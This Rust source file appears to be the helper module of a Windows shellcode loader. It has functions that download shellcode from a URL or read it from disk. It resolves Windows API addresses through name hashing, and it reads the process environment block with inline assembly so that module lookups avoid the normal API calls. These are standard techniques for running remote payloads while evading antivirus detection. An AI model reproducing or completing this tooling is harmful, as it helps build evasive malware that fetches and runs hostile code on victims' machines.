use crate::types;
use crate::helpers;
use std::arch::asm;
use std::collections::HashMap;
use std::fs::File;
use std::io::Read;
use reqwest;


// Download shellcode
pub fn download_file(url: &str) -> Vec<u8> {
    let mut shellcode: Vec<u8> = Vec::new();

    match reqwest::blocking::get(url) {
        Ok(response) => {
            shellcode = match response.bytes() {
                Ok(bytes) => bytes.to_vec(),
                Err(e) => {
                    println!("[!] Error getting shellcode: {}", e);
                    return Vec::new();
                }
            };
            return shellcode;
        },
        Err(e) => {
            println!("[!] Error making request: {}", e);
            return Vec::new();
        }
    }

}


// Read shellcode from file
pub fn read_file(path: &str) -> Option<Vec<u8>> {
    let mut file_handle = match File::open(path) {
        Ok(file) => file,
        Err(e) => { 
            println!("Error opening file: {}", e);
            return None;
        }
    };

    let mut data: Vec<u8> = Vec::new();
    match file_handle.read_to_end(&mut data) {
        Ok(_) => { 
            Some(data)
        },
        Err(e) => { 
            println!("Error reading file: {}", e); 
            return None;
        }
    }
}


// Initialize the APIs hashmap
pub fn initAPIs(lib_hash: u32, api_hashes: HashMap<&str, u32>) -> HashMap<&str, types::LPVOID> {

    // Get a handle to the module containing the APIs
    let module_handle: types::HANDLE = helpers::GetModHand(lib_hash);
    if module_handle.is_null() {
        println!("[!] Could not get module handle");
        return HashMap::new();
    }

    // Get the addresses of all specified APIs
    let apis: HashMap<&str, types::LPVOID> = api_hashes.iter().enumerate().filter_map(|(index, (name, hash))| {
        let func_addr = helpers::GetAddr(module_handle, *hash);
        if !func_addr.is_null() {
            Some((*name, func_addr))
        } else {
            None
        }
    }).collect();

    return apis;
}


// Simple hashing function
pub fn HashA(message: &str) -> u32 {
    let mut index: types::SIZE_T = 0;
    let mut hash: u32 = 0;
    let length: types::SIZE_T = message.len() as usize;
    let seed: u32 = 8;

    while (index != length) {
        let byte_value = message.as_bytes()[index]; // Convert char to byte
        hash = hash.wrapping_add(byte_value as u32); // Cast to u32 before addition
        hash = hash.wrapping_add(hash << seed);
        hash ^= hash >> 6;
        index += 1; // Increment index
    }

    hash = hash.wrapping_add(hash << 3);
    hash ^= hash >> 11;
    hash = hash.wrapping_add(hash << 15);

    return hash;
}


// Get access to PEB
#[cfg(target_arch = "x86_64")]
pub fn get_peb() -> *mut types::PEB {
    let peb: *mut types::PEB;
    unsafe {
        asm!("mov {}, gs:0x60", out(reg) peb);
    }
    return peb;
}
// x86
#[cfg(target_arch = "x86")]
pub fn get_peb() -> *mut types::PEB {
    let peb: *mut types::PEB;
    unsafe {
        asm!("mov {}, fs:0x30", out(reg) peb);
    }
    return peb;
}